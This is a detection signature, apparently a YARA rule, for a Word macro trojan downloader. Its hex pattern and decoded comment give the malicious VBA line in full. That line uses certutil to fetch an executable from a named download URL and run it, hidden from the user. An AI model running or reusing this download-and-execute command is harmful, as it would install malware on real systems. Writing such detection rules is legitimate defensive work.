
rule TrojanDownloader_O97M_Powdow_KAAO_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.KAAO!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 64 64 6c 38 2e 64 61 74 61 2e 68 75 2f 67 65 74 2f 32 38 32 38 33 34 2f 31 33 33 31 30 30 30 30 2f 41 72 65 77 64 2e 65 78 65 22 22 20 42 71 79 6a 72 70 63 68 67 67 70 70 62 2e 65 78 65 2e 65 78 65 20 26 26 20 42 71 79 6a 72 70 63 68 67 67 70 70 62 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //00 00  = Shell("cmd /c certutil.exe -urlcache -split -f ""http://ddl8.data.hu/get/282834/13310000/Arewd.exe"" Bqyjrpchggppb.exe.exe && Bqyjrpchggppb.exe.exe", vbHide)
	condition:
		any of ($a_*)
 
}